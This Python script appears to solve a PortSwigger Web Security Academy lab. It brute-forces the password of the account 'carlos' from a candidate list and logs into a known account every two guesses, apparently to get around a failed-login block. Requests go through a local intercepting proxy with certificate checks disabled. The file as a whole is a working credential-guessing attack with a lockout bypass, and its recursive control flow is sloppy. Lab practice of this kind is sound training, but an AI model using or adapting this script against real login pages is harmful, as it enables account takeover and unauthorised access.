import requests
import warnings

from urllib3.exceptions import InsecureRequestWarning

warnings.filterwarnings("ignore", category=InsecureRequestWarning)

password_file='candidate_pass.txt'

target_url='https://0a73007604ef0fc3c0c0ff9f00350023.web-security-academy.net/login'
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}
data={'username' : 'wiener' , 'password':'peter'}


def brute():
    i=0
    with open(password_file,'r') as f:
        for password in f.read().split("\n"):
            data={'username': 'carlos' ,'password':password }
            response=requests.post(url=target_url,data=data,proxies=proxies,verify=False)
            if "Incorrect password" not in response.text:
                print(f"carlos : {password} .This is correct combination")
                break
            else:
                print(f" carlos : {password} [-]")
                i=i+1
            if i==2:
                login()


def login():

    response=requests.post(url=target_url,data=data,proxies=proxies,verify=False)
    if response.status_code == 200:
        print("I logged in")
        last_password = brute()
        brute()
    else:
        print("there is a some problem")

if __name__ == "__main__":
    login()